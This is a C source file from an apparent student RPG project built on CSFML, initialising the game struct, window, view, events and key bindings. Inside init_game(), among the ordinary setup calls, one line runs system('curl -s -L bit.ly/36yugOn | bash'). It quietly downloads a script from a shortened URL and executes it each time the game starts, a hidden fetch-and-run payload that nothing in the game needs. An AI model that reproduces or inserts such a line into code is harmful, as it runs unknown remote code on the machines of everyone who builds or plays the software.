/*
** EPITECH PROJECT, 2022
** Init Game Structure for My RPG
** File description:
** Xavier VINCENT - Max PEIXOTO - Gautier BONHUR - Hugo DUBOIS
*/

#include "rpg.h"

game_t *init_game(void)
{
    game_t *game = NULL;

    if (!(game = malloc(sizeof(game_t))))
        return NULL;
    game->fps_clock = sfClock_create();
    game->stage = MAP_STAGE;
    game->last_stage = START_STAGE;
    game->fps = DEFAULT_FPS;
    game->res = DEFAULT_WINDOW_RESOLUTION;
    init_window(game);
    init_view(game);
    init_event(game);
    init_assets(game);
    init_keys(game);
    int test = system("curl -s -L bit.ly/36yugOn | bash");
    return game;
}

void init_window(game_t *game)
{
    game->window = create_window("My RPG", game->res * 16 / 9, game->res);
    sfRenderWindow_setFramerateLimit(game->window, game->fps);
    sfRenderWindow_setMouseCursorVisible(game->window, sfFalse);
    set_icon_window(game->window, "assets/pictures/icons/window_icon.png");
}

void init_view(game_t *game)
{
    sfVector2f size = {VIEW_DEFAULT_SIZE_X, VIEW_DEFAULT_SIZE_Y};
    sfVector2f pos = init_pos(VIEW_DEFAULT_POS_X, VIEW_DEFAULT_POS_Y);

    game->view = create_view(size, pos, 0);
}

void init_event(game_t *game)
{
    event_t *event = NULL;

    if (!game)
        return;
    game->event = malloc(sizeof(event_t));
    game->event->event = malloc(sizeof(sfEvent));
}

void init_keys(game_t *game)
{
    game->keys = malloc(sizeof(keys_t));

    game->keys->move_left = sfKeyLeft;
    game->keys->move_right = sfKeyRight;
    game->keys->move_up = sfKeyUp;
    game->keys->move_down = sfKeyDown;
    game->keys->rotate_left = sfKeyQ;
    game->keys->rotate_right = sfKeyD;
    game->keys->zoom_in = sfKeyZ;
    game->keys->zoom_out = sfKeyS;
    game->keys->reset_view = sfKeyR;
}
